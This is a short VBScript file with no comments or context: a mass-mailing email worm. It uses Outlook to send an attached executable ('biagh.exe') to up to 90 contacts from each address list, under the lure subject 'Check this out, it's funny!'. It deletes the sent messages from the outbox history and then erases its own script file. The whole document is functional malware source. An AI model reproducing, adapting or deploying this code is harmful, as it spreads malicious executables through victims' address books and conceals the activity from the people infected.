On Error Resume Next
Dim scrambler, Mail, Counter, A, B, C, D, E, F
Set scrambler = CreateObject("outlook.application")
Set Mail = scrambler.GetNameSpace("MAPI")
For A = 1 To Mail.AddressLists.Count
Set B = Mail.AddressLists(A)
Counter = 1
Set C = scrambler.CreateItem(0)
For D = 1 To B.AddressEntries.Count
E = B.AddressEntries(Counter)
C.Recipients.Add E
Counter = Counter + 1
If Counter > 90 Then Exit For
Next
C.Subject = "Check this out, it's funny!"
C.Attachments.Add "C:\WINDOWS\system\biagh.exe"
C.DeleteAfterSubmit = True
C.Send
E = ""
Next
Set F = CreateObject("Scripting.FileSystemObject")
F.DeleteFile Wscript.ScriptFullName
